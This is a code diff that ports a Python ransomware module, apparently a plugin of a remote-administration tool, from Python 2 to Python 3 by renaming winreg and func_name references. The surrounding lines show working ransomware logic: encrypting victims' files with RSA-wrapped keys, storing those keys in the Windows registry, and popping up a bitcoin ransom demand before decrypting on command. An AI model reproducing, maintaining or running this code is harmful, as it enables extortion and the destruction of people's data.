@@ -16,13 +16,13 @@ import threading
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
 if sys.platform == 'win32':
-    import _winreg
+    import winreg
 
 # utilities
 import core.util as util
 
 # globals
-packages = ['_winreg','Cryptodome.PublicKey.RSA','Cryptodome.Cipher.PKCS1_OAEP']
+packages = ['winreg','Cryptodome.PublicKey.RSA','Cryptodome.Cipher.PKCS1_OAEP']
 platforms = ['win32']
 threads = {}
 tasks = Queue.Queue()
@@ -64,7 +64,7 @@ def _threader(tasks):
                 else:
                     break
     except Exception as e:
-        util.log("{} error: {}".format(_threader.func_name, str(e)))
+        util.log("{} error: {}".format(_threader.__name__, str(e)))
 
 @util.threaded
 def _iter_files(rsa_key, base_dir=None):
@@ -77,19 +77,19 @@ def _iter_files(rsa_key, base_dir=None):
                     util.log("Target directory '{}' not found".format(base_dir))
             else:
                 cipher  = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
-                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['_registry_key'], 0, _winreg.KEY_READ)
+                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, globals()['_registry_key'], 0, winreg.KEY_READ)
                 i = 0
                 while True:
                     try:
-                        filename, key, _ = _winreg.EnumValue(reg_key, i)
+                        filename, key, _ = winreg.EnumValue(reg_key, i)
                         key = cipher.decrypt(base64.b64decode(key))
                         globals()['tasks'].put_nowait((decrypt_file, (filename, key)))
                         i += 1
                     except:
-                        _winreg.CloseKey(reg_key)
+                        winreg.CloseKey(reg_key)
                         break
     except Exception as e:
-        util.log('{} error: {}'.format(_iter_files.func_name, str(e)))
+        util.log('{} error: {}'.format(_iter_files.__name__, str(e)))
 
 
 def request_payment(bitcoin_wallet, text=None, title=None):
@@ -110,9 +110,9 @@ def request_payment(bitcoin_wallet, text=None, title=None):
                 return "{} missing argument(s): bitcoin_wallet, payment_url"
             return "Launched a Windows Message Box with ransom payment information"
         else:
-            return "{} does not yet support {} platform".format(request_payment.func_name, sys.platform)
+            return "{} does not yet support {} platform".format(request_payment.__name__, sys.platform)
     except Exception as e:
-        return "{} error: {}".format(request_payment.func_name, str(e))
+        return "{} error: {}".format(request_payment.__name__, str(e))
 
 
 def encrypt_file(filename, rsa_key):
@@ -147,7 +147,7 @@ def encrypt_file(filename, rsa_key):
         else:
             _debugger.debug("File '{}' not found".format(filename))
     except Exception as e:
-        _debugger.debug("{} error: {}".format(encrypt_file.func_name, str(e)))
+        _debugger.debug("{} error: {}".format(encrypt_file.__name__, str(e)))
     return False
 
 
@@ -173,7 +173,7 @@ def decrypt_file(filename, key):
         else:
             _debugger.debug("File '{}' not found".format(filename))
     except Exception as e:
-        _debugger.debug("{} error: {}".format(decrypt_file.func_name, str(e)))
+        _debugger.debug("{} error: {}".format(decrypt_file.__name__, str(e)))
     return False
 
 
@@ -201,7 +201,7 @@ def encrypt_files(args):
         else:
             return "File '{}' does not exist".format(target)
     except Exception as e:
-        util.log("{} error: {}".format(encrypt_files.func_name, str(e)))
+        util.log("{} error: {}".format(encrypt_files.__name__, str(e)))
 
 
 def decrypt_files(rsa_key):
@@ -221,7 +221,7 @@ def decrypt_files(rsa_key):
         globals()['threads']['decrypt-files'] = _threader()
         return "Decrypting files"
     except Exception as e:
-        util.log("{} error: {}".format(decrypt_files.func_name, str(e)))
+        util.log("{} error: {}".format(decrypt_files.__name__, str(e)))
 
 def run(args=None):
     """ 
@@ -238,6 +238,6 @@ def run(args=None):
         elif 'decrypt' in cmd:
             return decrypt_files(action)
         elif 'encrypt' in cmd:
-            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
+            reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_key)
             return encrypt_files(action)
     return globals()['usage']
